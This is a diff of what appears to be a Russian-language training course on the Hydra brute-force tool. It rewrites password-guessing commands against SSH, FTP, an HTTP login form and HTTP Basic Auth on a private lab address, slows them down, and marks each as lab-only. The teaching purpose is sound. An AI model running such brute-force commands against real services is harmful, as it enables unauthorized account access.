@@ -200,23 +200,23 @@ hydra -t 1 -L users_lab.txt -P passwords_lab.txt -W 3 ssh://192.168.100.20
 # [22][ssh] host: 192.168.100.20   login: lab-user   password: <redacted-lab-secret>
 
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-hydra -L users.txt -P passwords.txt ssh://192.168.100.20
+hydra -t 1 -L users_lab.txt -P passwords_lab.txt -W 3 -f ssh://192.168.100.20
 
 # Брутфорс FTP
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-hydra -l admin -P wordlist.txt ftp://192.168.100.20
+hydra -t 1 -l admin -P passwords_lab.txt -W 3 -f ftp://192.168.100.20
 
 # Брутфорс HTTP Form (POST)
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-hydra -l admin -P wordlist.txt 192.168.100.20 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -t 1 -l admin -P passwords_lab.txt -W 3 -f 192.168.100.20 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
 
 # Брутфорс HTTP Basic Auth
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-hydra -l admin -P wordlist.txt 192.168.100.20 http-get /admin/
+hydra -t 1 -l admin -P passwords_lab.txt -W 3 -f 192.168.100.20 http-get /admin/
 
 # Настройка количества потоков: в курсе оставляем минимальный темп
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-hydra -t 1 -l admin -P wordlist.txt -W 3 ssh://192.168.100.20
+hydra -t 1 -l admin -P passwords_lab.txt -W 3 -f ssh://192.168.100.20
 ```
 
 ### Параметры Hydra
